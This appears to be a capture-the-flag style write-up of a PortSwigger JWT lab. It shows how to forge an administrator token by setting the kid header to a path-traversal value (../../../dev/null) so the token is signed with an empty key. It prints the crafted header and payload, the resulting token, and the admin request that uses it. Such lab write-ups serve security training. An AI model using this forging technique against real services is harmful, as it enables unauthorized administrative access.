# JWT Authentication Bypass — KID Header Path Traversal

This lab uses JWTs to manage sessions. To verify a token's signature, the server uses the `kid` header parameter to look up the matching key on its filesystem.

**Goal:** Forge a JWT that grants access to the admin panel at `/admin`, then delete the user `carlos`.

Login credentials for your own account: wiener:peter

Tip: Getting comfortable with handling JWTs in Burp Suite beforehand is recommended.

---

**Reference:**
- https://portswigger.net/web-security/jwt

<img width="771" height="779" alt="1" src="https://github.com/user-attachments/assets/72d2e96d-60fa-4dd9-b0bc-25342ea464f1" />


---

A JWT can be built in jwt.io by pointing `kid` at a known-empty file (so it effectively signs with a blank/null key) and setting these values:

```
{
  "kid": "../../../dev/null",
  "alg": "HS256"
}
```

```
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1683794863
}
```

<img width="1071" height="570" alt="2" src="https://github.com/user-attachments/assets/cbe04053-448c-4973-aa7f-b0c579f9af38" />


Resulting JWT:

```
eyJraWQiOiIuLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTQ4NjN9.b8LLRBm6W5U8yph9LZVt24QSyamKPZAbrlaoQxAnaGM
``` 

```
GET /admin HTTP/2
...
Cookie: session=eyJraWQiOiIuLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTQ4NjN9.b8LLRBm6W5U8yph9LZVt24QSyamKPZAbrlaoQxAnaGM
...
```

<img width="779" height="474" alt="3" src="https://github.com/user-attachments/assets/8be8b261-59d9-4ef4-8df9-faa581bfa915" />

